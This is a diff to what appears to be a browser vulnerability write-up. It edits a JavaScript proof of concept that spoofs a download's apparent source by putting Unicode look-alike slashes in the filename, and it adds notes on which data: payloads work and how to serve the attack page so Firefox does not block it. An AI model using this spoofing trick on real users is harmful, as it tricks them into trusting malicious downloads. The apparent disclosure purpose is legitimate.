@@ -41,10 +41,15 @@ text left is the page-controlled title:
 
 ```js
 const a = document.createElement("a");
-a.href = "data:application/octet-stream;base64,eA==";
+a.href = "data:text/html,<b>x</b>";
 a.download = "ini aplikasi apa From https\u2236\u2215\u2215google.com.apk";
 a.click();
 ```
+
+Any `data:` payload works (`data:text/html`, `data:,x`, `data:application/octet-stream`).
+A `data:` page cannot be opened by clicking a link — Firefox blocks top-level `data:`
+navigation — so the attack page itself must be served over http(s); only the download
+target is `data:`.
 
 | Source | Subtitle |
 |---|---|
